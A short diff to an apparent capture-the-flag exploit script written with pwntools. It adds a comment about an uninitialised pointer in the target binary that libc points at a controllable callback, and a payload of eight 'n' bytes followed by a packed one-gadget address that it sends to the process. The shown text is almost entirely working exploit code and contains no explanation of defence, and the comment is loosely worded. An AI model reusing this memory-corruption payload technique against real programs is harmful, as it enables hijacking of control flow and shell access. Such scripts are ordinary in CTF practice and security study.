@@ -60,7 +60,17 @@ def exp():
         pause()
     yes()
     solve3()
-    payload = "nnnnnnnn" + p32(one_addr)
+    '''
+    notice that var main:v4 is a pointer without init which make program only run on ubuntu 14.04,but it init by libc point to  a specil addr where can contorl a callback 
+   struct_v4
+      [int unknown
+       int unknown
+       int callback
+       int return_addr
+       ... 
+      ]
+    '''
+    payload = 'n' * 8 + p32(one_addr)
     p.sendline(payload)
     p.sendline("n")
     p.recvuntil("exit now......")
